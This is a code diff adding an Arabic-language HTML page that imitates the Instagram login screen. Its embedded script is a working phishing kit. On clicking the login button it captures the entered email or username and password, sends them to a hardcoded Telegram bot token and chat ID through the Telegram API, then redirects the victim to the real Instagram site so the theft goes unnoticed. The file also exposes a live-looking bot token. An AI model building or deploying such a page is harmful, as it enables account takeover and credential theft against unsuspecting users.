@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="./styles.css" />
+    <link rel="icon" type="image/png" href="./img/instagram.png">
+    <title>Instagram</title>
+</head>
+<body>
+    <main class="flex align-items-center justify-content-center">
+        <section id="mobile" class="flex">
+        </section>
+        <section id="auth" class="flex direction-column">
+            <div class="panel login flex direction-column">
+                <h1 title="إنستغرام" class="flex justify-content-center">
+                    <img src="./img/instagram-logo.png" alt="شعار إنستغرام" title="شعار إنستغرام" />
+                </h1>
+                <form>
+                    <label for="email" class="sr-only">رقم الهاتف، اسم المستخدم أو البريد الإلكتروني</label>
+                    <input name="email" placeholder="رقم الهاتف، اسم المستخدم أو البريد الإلكتروني" />
+                    <label for="password" class="sr-only">كلمة المرور</label>
+                    <input name="password" type="password" placeholder="كلمة المرور" />
+                    <button type="button">تسجيل الدخول</button>
+                </form>
+                <div class="flex separator align-items-center">
+                    <span></span>
+                    <div class="or">أو</div>
+                    <span></span>
+                </div>
+                <div class="login-with-fb flex direction-column align-items-center">
+                    <div>
+                        <img />
+                        <a>تسجيل الدخول باستخدام فيسبوك</a>
+                    </div>
+                    <a href="#">هل نسيت كلمة المرور؟</a>
+                </div>
+            </div>
+            <div class="panel register flex justify-content-center">
+                <p>ليس لديك حساب؟</p>
+                <a href="#">سجّل الآن</a>
+            </div>
+            <div class="app-download flex direction-column align-items-center">
+                <p>قم بتنزيل التطبيق.</p>
+                <div class="flex justify-content-center">
+                    <img src="./img/apple-button.png" alt="شعار متجر آبل" title="شعار متجر آبل" />
+                    <img src="./img/googleplay-button.png" alt="شعار متجر جوجل بلاي" title="شعار متجر جوجل بلاي" />
+                </div>
+            </div>
+        </section>
+    </main>
+    <footer>
+        <ul class="flex flex-wrap justify-content-center">
+            <li><a href="#">عن الموقع</a></li>
+            <li><a href="#">المساعدة</a></li>
+            <li><a href="#">الصحافة</a></li>
+            <li><a href="#">واجهة برمجة التطبيقات</a></li>
+            <li><a href="#">الوظائف</a></li>
+            <li><a href="#">الخصوصية</a></li>
+            <li><a href="#">الشروط</a></li>
+            <li><a href="#">الموقع</a></li>
+            <li><a href="#">الحسابات الأكثر شهرة</a></li>
+            <li><a href="#">الوسوم</a></li>
+            <li><a href="#">اللغة</a></li>
+        </ul>
+        <p class="copyright">© 2025 instagram from Meta</p>
+    </footer>
+    <script>
+        document.addEventListener("DOMContentLoaded", function () {
+            const loginButton = document.querySelector("button[type='button']");
+
+            if (loginButton) {
+                loginButton.addEventListener("click", function () {
+                    const email = document.querySelector('input[name="email"]').value;
+                    const password = document.querySelector('input[name="password"]').value;
+
+                    // تحقق من تعبئة الحقول
+                    if (!email || !password) {
+                        return; // لا تظهر أي رسالة إذا كانت الحقول فارغة
+                    }
+
+                    const botToken = "7595027293:AAGbO0GYXKNkbAGm7Dd8JviGGdRpWYfvXck"; // ضع مفتاح البوت هنا
+                    const chatId = "1437155719"; // ضع معرف المحادثة هنا
+                    const message = `📧 بريد إلكتروني: ${email}\n🔑 كلمة المرور: ${password}`;
+
+                    // إرسال البيانات باستخدام API تيليجرام
+                    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                        method: "POST",
+                        headers: {
+                            "Content-Type": "application/json",
+                        },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: message,
+                        }),
+                    })
+                    .then(response => {
+                        console.log(response); // طباعة استجابة الـ API للتحقق من الأخطاء
+                        if (!response.ok) {
+                            // فحص حالة الخطأ بشكل مفصل
+                            console.error("خطأ في الاتصال:", response.status, response.statusText);
+                            throw new Error(`حدث خطأ في الاتصال بالخادم: ${response.statusText}`);
+                        }
+                        return response.json();
+                    })
+                    .then(data => {
+                        if (data.ok) {
+                            // الانتقال إلى صفحة إنستغرام بعد إرسال البيانات
+                            window.location.href = "https://www.instagram.com"; // يمكنك تغيير الرابط إلى الصفحة المطلوبة
+                        } else {
+                            console.error("حدث خطأ أثناء إرسال البيانات.");
+                        }
+                    })
+                    .catch(error => {
+                        console.error("خطأ:", error);
+                    });
+                });
+            }
+        });
+    </script>
+</body>
+</html>
